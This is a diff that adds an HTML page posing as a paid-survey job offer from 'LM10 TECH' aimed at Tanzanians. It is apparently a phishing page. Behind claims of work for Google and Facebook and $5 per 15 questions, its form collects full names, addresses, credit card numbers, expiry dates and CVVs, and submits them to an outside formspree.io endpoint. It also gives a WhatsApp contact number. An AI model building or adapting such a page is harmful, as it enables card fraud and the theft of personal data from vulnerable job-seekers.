@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="/jobs.css">
+    <title>Document</title>
+  </head>
+  <body class="d-flex flex-column justify-content-around">
+    <header class = "mb-4 mt-4" >
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+      <div class="container-fluid">
+        <a href="/" class="navbar-brand">JOBS</a>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarSupportedContent"
+          aria-controls="navbarSupportedContent"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+            <li class="nav-item">
+            </li>
+          </ul>
+          <form class="d-flex">
+            <input
+              class="form-control me-2 "
+              type="search"
+              placeholder="enter name"
+              aria-label="Search"
+              name="name"
+        
+            />
+            <button class="btn btn-outline-success" type="submit">
+             sumbit name
+            </button>
+          </form>
+        </div>
+      </div>
+    </nav>
+</header>
+<section class="container-fluid"> 
+<blockquote class="blockquote mt-2 mb-2">
+<p><strong>our company we offer survey services to big companies.We've worked with the likes of google, facebook providing them crucial data from all over the world. We collect those data through paid surveys</strong></p>
+  <footer class="blockquote-footer">head of recruitent from <cite title="Source Title">LM10 TECH</cite></footer>
+</blockquote>
+<div class="alert alert-success" role="alert">
+  our systems detected you are from tanzania! please fill the form below to receive questions
+</div>
+<sectiom class="container-fluid">
+  <dt class="col-sm-3">PAYMENT MODE:</dt>
+  <dd class="col-sm-9 lead">we only pay people from tanzania through airtel visa card</dd>
+
+
+  <dt class="col-sm-3">AMOUNT:</dt>
+  <dd class="col-sm-9 lead">we pay 5 dollars per 15 questions, roughly 10-15 minutes, false answers won't be considered</dd>
+  <dt class="col-sm-3 text-truncate"> WHATSAPP US AT:  </dt>
+  <dd class="col-sm-9 lead">+14099952364</dd>
+</section>
+<sectio class="container-fluid">
+    <div class="row">
+  <div class="col-75">
+    <div class="container">
+      <form  action="https://formspree.io/f/xvolqyod"
+  method="POST">
+
+        <div class="row">
+          <div class="col-50">
+            <h3>Billing Address</h3>
+            <label for="fname"><i class="fa fa-user"></i> Full Name</label>
+            <input type="text" id="fname" name="firstname" placeholder="John M. Doe">
+            <label for="email"><i class="fa fa-envelope"></i> Email</label>
+            <input type="text" id="email" name="email" placeholder="john@example.com">
+            <label for="adr"><i class="fa fa-address-card-o"></i> Address</label>
+            <input type="text" id="adr" name="address" placeholder="542 W. 15th Street">
+            <label for="city"><i class="fa fa-institution"></i> City</label>
+            <input type="text" id="city" name="city" placeholder="New York">
+
+            <div class="row">
+              <div class="col-50">
+                <label for="state">State</label>
+                <input type="text" id="state" name="state" placeholder="NY">
+              </div>
+              <div class="col-50">
+                <label for="zip">Zip</label>
+                <input type="text" id="zip" name="zip" placeholder="10001">
+              </div>
+            </div>
+          </div>
+
+          <div class="col-50">
+            <h3>Payment</h3>
+            <label for="fname">Accepted Cards</label>
+            <div class="icon-container">
+              <img src="https://logosvector.net/wp-content/uploads/2012/10/airtel-logo-vector.png" alt="av" width="70px" height="70px">
+            </div>
+            <label for="cname">Name on Card</label>
+            <input type="text" id="cname" name="cardname" placeholder="John More Doe">
+            <label for="ccnum">Credit card number</label>
+            <input type="text" id="ccnum" name="cardnumber" placeholder="1111-2222-3333-4444">
+            <label for="expmonth">Exp Month</label>
+            <input type="text" id="expmonth" name="expmonth" placeholder="September">
+
+            <div class="row">
+              <div class="col-50">
+                <label for="expyear">Exp Year</label>
+                <input type="text" id="expyear" name="expyear" placeholder="2018">
+              </div>
+              <div class="col-50">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" name="cvv" placeholder="352">
+              </div>
+            </div>
+          </div>
+
+        </div>
+        <label>
+          <input type="checkbox" checked="checked" name="sameadr"> Shipping address same as billing
+        </label>
+        <input type="submit" value="save card" class="btn">
+      </form>
+    </div>
+  </div>
+
+  <div class="col-25">
+    <div class="container">
+      <h4>Cart
+        <span class="price" style="color:black">
+          <i class="fa fa-shopping-cart"></i>
+          <b>1</b>
+        </span>
+      </h4>
+      <p><a href="#">survey earning</a> <span class="price">$0</span></p>
+      <hr>
+      <p>Total <span class="price" style="color:black"><b>$0</b></span></p>
+    </div>
+  </div>
+</div>
+</section>
+  </body>
+</html>
